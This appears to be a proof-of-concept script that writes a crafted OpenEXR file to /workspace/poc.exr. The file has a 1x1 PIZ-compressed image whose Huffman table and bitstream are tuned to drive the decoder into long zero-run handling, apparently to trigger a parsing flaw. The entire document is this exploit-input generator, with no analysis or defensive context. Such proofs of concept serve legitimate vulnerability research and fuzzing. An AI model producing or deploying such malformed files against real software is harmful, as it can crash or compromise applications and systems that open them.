import struct

def create_exr_poc():
    # EXR file with PIZ compression, 1x1 image, single HALF channel
    
    # Magic number
    magic = struct.pack('<I', 0x01312f76)
    
    # Version field: version 2, flags 0
    version = struct.pack('<H', 2)
    
    # Header attributes
    header = b''
    
    # channels attribute
    # Channel: "Y", type HALF (1), pLinear 0, reserved 3 bytes, xSampling 1, ySampling 1
    chlist_value = b'Y\x00' + struct.pack('<i', 1) + struct.pack('<B', 0) + b'\x00\x00\x00' + struct.pack('<i', 1) + struct.pack('<i', 1) + b'\x00'
    header += b'channels\x00' + b'chlist\x00' + struct.pack('<I', len(chlist_value)) + chlist_value
    
    # compression attribute: PIZ = 1
    header += b'compression\x00' + b'compression\x00' + struct.pack('<I', 1) + struct.pack('<B', 1)
    
    # dataWindow: box2i (xmin, ymin, xmax, ymax)
    dataWindow = struct.pack('<iiii', 0, 0, 0, 0)
    header += b'dataWindow\x00' + b'box2i\x00' + struct.pack('<I', 16) + dataWindow
    
    # displayWindow: box2i
    displayWindow = struct.pack('<iiii', 0, 0, 0, 0)
    header += b'displayWindow\x00' + b'box2i\x00' + struct.pack('<I', 16) + displayWindow
    
    # lineOrder: 0 (increasing Y)
    header += b'lineOrder\x00' + b'lineOrder\x00' + struct.pack('<I', 1) + struct.pack('<B', 0)
    
    # pixelAspectRatio: float
    header += b'pixelAspectRatio\x00' + b'float\x00' + struct.pack('<I', 4) + struct.pack('<f', 1.0)
    
    # screenWindowCenter: v2f
    screenWindowCenter = struct.pack('<ff', 0.0, 0.0)
    header += b'screenWindowCenter\x00' + b'v2f\x00' + struct.pack('<I', 8) + screenWindowCenter
    
    # screenWindowWidth: float
    header += b'screenWindowWidth\x00' + b'float\x00' + struct.pack('<I', 4) + struct.pack('<f', 1.0)
    
    # End of header
    header += b'\x00'
    
    # Offset table: 1 chunk, offset will be filled later
    offset_table = struct.pack('<Q', 0)
    
    # Chunk data
    # For scanline: y coordinate (4 bytes), data size (4 bytes), compressed data
    
    # PIZ compressed data:
    # minNonZero (2 bytes), maxNonZero (2 bytes), bitmap data, hufbytes (4 bytes), huffman data
    
    # Huffman data:
    # im (4 bytes), iM (4 bytes), tableLength (4 bytes), nBits (4 bytes), future (4 bytes)
    # Table data (17 bytes): 15 bytes of 0x00, then 0xC0, then 0x0F
    # Bitstream data (17 bytes)
    
    im = 0
    iM = 21
    tableLength = 17
    nBits = 129
    future = 0
    
    # Table data: 15 bytes of 0x00, then 0xC0, then 0x0F
    # This makes codes 0-19 = 0 (literal zero), code 20 = 48, code 21 = 63 (LONG_ZEROCODE_RUN)
    table_data = b'\x00' * 15 + b'\xC0' + b'\x0F'
    
    # Bitstream data: 17 bytes (nBytes = (129+7)/8 = 17)
    bitstream = b'\x00' * 17
    
    huffman_data = struct.pack('<IIIII', im, iM, tableLength, nBits, future) + table_data + bitstream
    hufbytes = len(huffman_data)
    
    # PIZ data
    minNonZero = 0
    maxNonZero = 0
    piz_data = struct.pack('<HH', minNonZero, maxNonZero) + struct.pack('<I', hufbytes) + huffman_data
    
    # Chunk: y coordinate, data size, compressed data
    chunk_y = 0
    chunk_data = struct.pack('<iI', chunk_y, len(piz_data)) + piz_data
    
    # Calculate offset
    offset = len(magic) + len(version) + len(header) + len(offset_table)
    
    # Update offset table
    offset_table = struct.pack('<Q', offset)
    
    # Write file
    with open('/workspace/poc.exr', 'wb') as f:
        f.write(magic)
        f.write(version)
        f.write(header)
        f.write(offset_table)
        f.write(chunk_data)
    
    print(f"Created /workspace/poc.exr")
    print(f"File size: {offset + len(chunk_data)} bytes")
    print(f"Huffman data size: {hufbytes}")
    print(f"Table data: {table_data.hex()}")
    print(f"im={im}, iM={iM}, nBits={nBits}")

